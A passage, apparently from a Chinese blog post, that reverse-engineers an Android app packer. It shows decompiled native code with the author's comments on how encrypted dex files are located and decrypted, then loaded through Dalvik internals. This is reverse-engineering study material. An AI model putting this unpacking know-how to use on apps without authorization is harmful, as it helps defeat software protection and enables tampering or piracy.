dword_54170);</span><br><span class="line">    sub_247D8(&amp;v39, env, v18);</span><br><span class="line">    <span class="keyword">if</span> ( &amp;v39 != (<span class="keyword">char</span> *)&amp;ali::g_libPath )</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;ali::g_libPath, v41, v40);</span><br><span class="line">    v19 = &amp;v39;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(v19);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"global native path is %s"</span>, dword_540D0);</span><br><span class="line">  v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0);</span><br><span class="line">  sub_247D8(&amp;v39, env, v21);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v39 != (<span class="keyword">char</span> *)&amp;ali::g_apkPath )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;ali::g_apkPath, v41, v40);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v39);</span><br><span class="line">  setenv(<span class="string">"APKPATH"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)dword_540B8, <span class="number">1</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"global apk path is %s"</span>, dword_540B8);</span><br><span class="line">  sub_24A64(env, v3);</span><br><span class="line">  v22 = (<span class="keyword">void</span> *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0);</span><br><span class="line">  v23 = v22;</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, <span class="number">0</span>);</span><br><span class="line">    v25 = v24;</span><br><span class="line">    v26 = <span class="built_in">strlen</span>(v24);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;ali::g_pkgName, v25, &amp;v25[v26]);</span><br><span class="line">    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25);</span><br><span class="line">  &#125;</span><br><span class="line">  v37 = <span class="number">0L</span>L;</span><br><span class="line">  v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8);</span><br><span class="line">  parse_dex(env, &amp;v37);                         <span class="comment">// parse dex?</span></span><br><span class="line">  replace_classloader_cookie(env, v27, v37, HIDWORD(v37));</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"enter new application"</span>);<span class="comment">// enter MainActivity?</span></span><br><span class="line">  v28 = dword_54120;</span><br><span class="line">  _JNIEnv::NewStringUTF(env, <span class="string">"android.app.Application"</span>);</span><br><span class="line">  v29 = _JNIEnv::CallObjectMethod(env, v27, v28);</span><br><span class="line">  v30 = v29;</span><br><span class="line">  <span class="keyword">if</span> ( v29 )</span><br><span class="line">  &#123;</span><br><span class="line">    v32 = _JNIEnv::GetMethodID(env, v29, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">    dword_540A0 = _JNIEnv::NewObject(env, v30, v32);</span><br><span class="line">    _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4);</span><br><span class="line">    _JNIEnv::DeleteLocalRef(env, v30);</span><br><span class="line">    v31 = <span class="string">"exit new application"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v31 = <span class="string">"can't findClass realAppClass"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = (ali *)_android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, v31);</span><br><span class="line">  <span class="keyword">if</span> ( dword_540A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0);</span><br><span class="line">    dword_540A0 = (<span class="keyword">int</span>)v33;</span><br><span class="line">  &#125;</span><br><span class="line">  v34 = ali::NanoTime(v33);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"##### attachBaseContext spent:"</span>);</span><br><span class="line">  ali::PrettyDuration((ali *)(v34 - v36), v35);</span><br><span class="line">  result = _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"exit attachBaseContext"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">parse_dex</span><span class="params">(_JNIEnv *a1, __int64 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v6; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// t1</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> (__fastcall *v19)(<span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>); <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v21; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v22; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> *v23; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v24; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// r6</span></span><br><span class="line">  ali::EncFile *v26; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v28; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v29; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">void</span> *v31; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> (__fastcall *v32)(<span class="keyword">unsigned</span> __int8 *, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span> *); <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> (__fastcall *v33)(_DWORD); <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v34; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v36; <span class="comment">// r7</span></span><br><span class="line">  _DWORD *v37; <span class="comment">// r9</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v39; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">void</span> *v40; <span class="comment">// r0</span></span><br><span class="line">  JNINativeMethod *v41; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v42; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v43; <span class="comment">// r3</span></span><br><span class="line">  _JNIEnv *v45; <span class="comment">// [sp+8h] [bp-2A0h]</span></span><br><span class="line">  __int64 *v46; <span class="comment">// [sp+10h] [bp-298h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [sp+24h] [bp-284h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v48; <span class="comment">// [sp+28h] [bp-280h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v49; <span class="comment">// [sp+2Ch] [bp-27Ch]</span></span><br><span class="line">  <span class="keyword">void</span> (__cdecl *v50)(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> *, jvalue *); <span class="comment">// [sp+30h] [bp-278h]</span></span><br><span class="line">  <span class="keyword">char</span> v51; <span class="comment">// [sp+34h] [bp-274h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v52[<span class="number">2</span>]; <span class="comment">// [sp+38h] [bp-270h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+40h] [bp-268h]</span></span><br><span class="line">  <span class="keyword">char</span> v54; <span class="comment">// [sp+54h] [bp-254h]</span></span><br><span class="line">  <span class="keyword">int</span> v55; <span class="comment">// [sp+64h] [bp-244h]</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [sp+68h] [bp-240h]</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// [sp+6Ch] [bp-23Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v58; <span class="comment">// [sp+80h] [bp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> v59; <span class="comment">// [sp+84h] [bp-224h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v60; <span class="comment">// [sp+98h] [bp-210h]</span></span><br><span class="line">  <span class="keyword">char</span> v61; <span class="comment">// [sp+9Ch] [bp-20Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v62; <span class="comment">// [sp+B0h] [bp-1F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v63; <span class="comment">// [sp+B4h] [bp-1F4h]</span></span><br><span class="line">  <span class="keyword">char</span> v64; <span class="comment">// [sp+CCh] [bp-1DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v65; <span class="comment">// [sp+E0h] [bp-1C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v66; <span class="comment">// [sp+E4h] [bp-1C4h]</span></span><br><span class="line">  <span class="keyword">char</span> v67; <span class="comment">// [sp+FCh] [bp-1ACh]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v68; <span class="comment">// [sp+110h] [bp-198h]</span></span><br><span class="line">  <span class="keyword">char</span> v69; <span class="comment">// [sp+114h] [bp-194h]</span></span><br><span class="line">  <span class="keyword">char</span> v70; <span class="comment">// [sp+12Ch] [bp-17Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v71; <span class="comment">// [sp+140h] [bp-168h]</span></span><br><span class="line">  <span class="keyword">char</span> v72; <span class="comment">// [sp+144h] [bp-164h]</span></span><br><span class="line">  <span class="keyword">char</span> *v73; <span class="comment">// [sp+154h] [bp-154h]</span></span><br><span class="line">  <span class="keyword">char</span> *v74; <span class="comment">// [sp+158h] [bp-150h]</span></span><br><span class="line">  <span class="keyword">char</span> v75; <span class="comment">// [sp+15Ch] [bp-14Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v76; <span class="comment">// [sp+174h] [bp-134h]</span></span><br><span class="line">  <span class="keyword">char</span> v77; <span class="comment">// [sp+18Ch] [bp-11Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v78; <span class="comment">// [sp+1A4h] [bp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> v79; <span class="comment">// [sp+1BCh] [bp-ECh]</span></span><br><span class="line">  <span class="keyword">char</span> v80; <span class="comment">// [sp+1D4h] [bp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> v81; <span class="comment">// [sp+1ECh] [bp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v82; <span class="comment">// [sp+204h] [bp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> v83; <span class="comment">// [sp+21Ch] [bp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v84; <span class="comment">// [sp+234h] [bp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [sp+244h] [bp-64h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v86; <span class="comment">// [sp+248h] [bp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v87; <span class="comment">// [sp+24Ch] [bp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v88; <span class="comment">// [sp+264h] [bp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> *v89; <span class="comment">// [sp+274h] [bp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *v90; <span class="comment">// [sp+278h] [bp-30h]</span></span><br><span class="line"></span><br><span class="line">  v45 = a1;</span><br><span class="line">  v46 = a2;</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"enter parse_dex"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ali::isDalvik )                          <span class="comment">// dalvik or art</span></span><br><span class="line">  &#123;</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v88, &amp;ali::g_filePath, <span class="string">"/cls.jar"</span>);<span class="comment">// locate cls.jar</span></span><br><span class="line">    v25 = v90;</span><br><span class="line">    v26 = (ali::EncFile *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xC</span>u);</span><br><span class="line">    ali::EncFile::EncFile(v26, v25);</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v49 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ali::sdk_int &gt; <span class="number">13</span> )                    <span class="comment">// sdk version &gt; 13</span></span><br><span class="line">    &#123;</span><br><span class="line">      v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;v47, <span class="number">0x10</span>u);</span><br><span class="line">      v49 = v48 + <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// sdk version &lt;= 13 ( android 3.x )</span></span><br><span class="line">    &#123;</span><br><span class="line">      v27 = ali::EncFile::open(v26, &amp;v49, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;v47);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v49 == (<span class="keyword">unsigned</span> __int8 *)<span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = (<span class="keyword">int</span> *)_errno(v27);</span><br><span class="line">      v29 = strerror(*v28);</span><br><span class="line">      _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"mmap dex file :%s"</span>, v29);</span><br><span class="line">LABEL_45:</span><br><span class="line">      v24 = &amp;v88;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = *((_DWORD *)v49 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ali::sdk_int &gt; <span class="number">13</span> )                    <span class="comment">// sdk version &gt; 13</span></span><br><span class="line">    &#123;</span><br><span class="line">      v40 = dlopen(<span class="string">"libdvm.so"</span>, <span class="number">1</span>);             <span class="comment">// open libdvm.so and start execute program</span></span><br><span class="line">      v41 = (JNINativeMethod *)dlsym(v40, <span class="string">"dvm_dalvik_system_DexFile"</span>);</span><br><span class="line">      v50 = <span class="number">0</span>;</span><br><span class="line">      lookup(v41, <span class="string">"openDexFile"</span>, <span class="string">"([B)I"</span>, &amp;v50);</span><br><span class="line">      v42 = v48;</span><br><span class="line">      *((_DWORD *)v48 + <span class="number">2</span>) = v47;</span><br><span class="line">      *(_DWORD *)&amp;v51 = v42;</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v50)();</span><br><span class="line">      v43 = v52[<span class="number">0</span>];</span><br><span class="line">      *v46 = v52[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + <span class="number">8</span>) + <span class="number">4</span>) + <span class="number">32</span>) = *(_DWORD *)(v43 + <span class="number">16</span>);</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + <span class="number">8</span>) + <span class="number">4</span>) + <span class="number">36</span>) = v47;</span><br><span class="line">      ali::EncFile::~EncFile(v26);</span><br><span class="line">      operator delete((void *)v26);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// sdk version &lt;= 13 ( android 3.x )</span></span><br><span class="line">    &#123;</span><br><span class="line">      v31 = dlopen(<span class="string">"libdvm.so"</span>, <span class="number">1</span>);</span><br><span class="line">      v32 = (<span class="keyword">int</span> (__fastcall *)(<span class="keyword">unsigned</span> __int8 *, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span> *))dlsym(v31, <span class="string">"dvmDexFileOpenPartial"</span>);</span><br><span class="line">      v33 = (<span class="keyword">int</span> (__fastcall *)(_DWORD))dlsym(v31, <span class="string">"dexCreateClassLookup"</span>);</span><br><span class="line">      v52[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v32(v49, v30, v52) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = <span class="string">"dvmDexFileOpenPartial error"</span>;</span><br><span class="line">LABEL_40:</span><br><span class="line">        _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, v34);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">      &#125;</span><br><span class="line">      v35 = *(_DWORD *)v52[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)(v35 + <span class="number">36</span>) = v33(*(_DWORD *)v52[<span class="number">0</span>]);</span><br><span class="line">      v36 = v52[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !*(_DWORD *)(*(_DWORD *)v52[<span class="number">0</span>] + <span class="number">36</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = <span class="string">"dexCreateClassLookup error"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      &#125;</span><br><span class="line">      v37 = <span class="built_in">malloc</span>(<span class="number">0x2C</span>u);</span><br><span class="line">      v38 = <span class="built_in">malloc</span>(<span class="number">0x14</span>u);</span><br><span class="line">      strdup((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_4CEE9);</span><br><span class="line">      v38[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">      v38[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)v38 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      v39 = v49;</span><br><span class="line">      *(_DWORD *)v38 = v38;</span><br><span class="line">      *((_DWORD *)v38 + <span class="number">3</span>) = v37;</span><br><span class="line">      v37[<span class="number">10</span>] = v36;</span><br><span class="line">      *(_DWORD *)(v36 + <span class="number">32</span>) = v39;</span><br><span class="line">      *(_DWORD *)(v36 + <span class="number">36</span>) = v47;</span><br><span class="line">      *v46 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v38;</span><br><span class="line">    &#125;</span><br><span class="line">    v23 = &amp;v88;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v54, &amp;ali::g_filePath, <span class="string">"/cls.jar"</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v57, &amp;ali::g_filePath, <span class="string">"/cls.dex"</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v59, &amp;ali::g_filePath, <span class="string">"/fak.jar"</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"before oat gen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !access(v58, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  v2 = android_getCpuFamily();</span><br><span class="line">  <span 